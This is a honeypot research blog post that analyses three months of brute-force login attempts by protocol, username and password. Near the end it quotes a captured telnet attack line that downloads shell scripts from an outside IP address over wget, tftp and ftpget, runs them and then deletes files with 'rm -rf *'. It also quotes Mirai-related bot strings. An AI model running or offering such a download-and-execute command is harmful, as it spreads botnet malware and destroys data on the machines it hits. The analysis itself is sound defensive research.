---
title: "Initial analysis of four million login attempts"
authors: ["Johnny Vestergaard"]
date: "2016-09-09"
categories: 
  - "analysis"
tags: 
  - "analysis"
  - "heralding"
  - "honeypot"
---

**Introduction**

This blog post is a follow up to an [earlier article](https://honeynet.org/node/1321), where I set out to conceive a system that could deliver the data needs to answer 5 specific questions.

**The setup**

To provide the data needed for this analysis, my setup consisted of 4 VPS situated respectively at Amazon EC2, Azure, MeeBox and a Danish ISP end-user connection. Even though the same 4 VPS were used throughout the data collection, 6 different IP addresses were used for the honeypots - the reason for this was that one of the honeypots had a dynamically assigned IP address. As mentioned in an [earlier article](https://honeynet.org/node/1321) all honeypots were running Heralding. The technical setup was automated with ansible.

**Time period and initial data**

A subset of all collected data was selected for analysis, the subset covered the period 24. may 2016 to 24. august 2016. In this period there were 4,369,149 login attempts. For each login attempt the following data was available:

timestamp, session\_id, auth\_id, protocol, source\_ip, source\_port, destination\_ip, destination\_port, username, password.

**Which protocols does my adversary try to brute-force?**

Since Heralding only supports 6 protocols (8 if you include ssl wrapped http and pop3), the possibility space is limited to the supported protocols. Furthermore the HTTP capability only supports basic authentication and the pop3 and smtp implementations also only supports a limited subset of the authentication mechanisms normally available for said protocols.

As expected the two most targeted protocols was SSH and Telnet, these two protocols combined saw around 93% of all brute force activity. More surprisingly it was found that SMTP and POP3 only saw around 7% of all activity, I expected the numbers for email protocols would be higher, but maybe SMTP relays sells too cheap to be worth the hassle?

**Attacks per protocol**

| Protocol | Attempts | Percentage |
|----------|----------|------------|
| SSH      | 2,717,874| 62%        |
| Telnet   | 1,353,050| 31%        |
| SMTP     | 196,601  | 5%         |
| POP3     | 83,420   | 2%         |
| HTTP     | 17,990   | <1%        |
| FTP      | 194      | <1%        |
| HTTPS    | 20       | <1%        |
| POP3S    | 0        | 0%         |

**Which username and password did he use?**

A total of 11685 usernames and 128001 was collected during the period. Not surprisingly the username root comes in at a first place with 2955040 login attempts. More surprising the second most attempted password was _/bin/busybox MIRAI_, this is most definitely not an password attempt - but looks more like trying to execute some known malware. Never the less this was attempted 106969 times, it would be interesting to look at the timing of these - maybe it can be correlated with OSINT on this specific malware. Update: For further information in regards to MIRAI, check this [article](http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html?m=1) by [MalwareMustDie](http://malwaremustdie.org).

**Top 5 usernames**

| Username | Attempts |
|----------|----------|
| root     | 2,955,040|
| admin    | 300,637  |
| shell    | 147,641  |
| support  | 114,015  |
| sh       | 107,741  |

**Top 5 passwords**

| Password           | Attempts |
|--------------------|----------|
| enable             | 107,361  |
| /bin/busybox MIRAI | 106,969  |
| 12345              | 105,879  |
| admin              | 101,248  |
| 1234               | 89,741   |

A curated list of all attempted passwords can be found [here](https://raw.githubusercontent.com/johnnykv/various/master/stripped_passwords.txt) and a list of usernames [here](https://raw.githubusercontent.com/johnnykv/various/master/stripped_usernames.txt).

**Future work**

Still 3 of the original questions need to be answered, the data is at hand - and will result in another blog post when I find the time. For the record, the remaining questions are:

- At which speed did he brute-force?
- From where did he proxy from?
- What time of day did he brute-force?

Also it would be interesting to do an analysis of username and password combinations.

One thing i especially noted, is that some of telnet login attempts is not normal bruteforce activity. Some of it looks to be raw shell exploitations attempts:

`cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.207.135.146/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 104.207.135.146 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.207.135.146; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.207.135.146 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *`

Others looks to be some kind of malfunctional bot:

`Failed opening raw socket.Failed setting raw headers mode.all,synrstfinackpshInvalid flag "%s"PONG!GETLOCALIPMy IP: %sSCANNERSCANNER ON | OFFOFFSCANNER STOPPED!ONSCANNER STARTED!HOLDJUNKUDPTCPKILLATTKLOLNOGTFO8`

And now it gets plain old weird, this entry looks like logs from another honeypot: `Failed telnet attempt - 2.180.25.253:root:toor Failed telnet attempt - 120.36.60.61:admin:toor`

Want to do your own analysis or crazy visualizations? [Contact me](mailto:jkv@unixcluster.dk), and I will provide you with the raw data (IP addresses will be sanitized). The only condition, is that your analysis must be made public.

 

Regards,

Johnny Vestergaard

[LinkedIN](https://www.linkedin.com/in/johnnykv)

[Mail](mailto:jkv@unixcluster.dk)
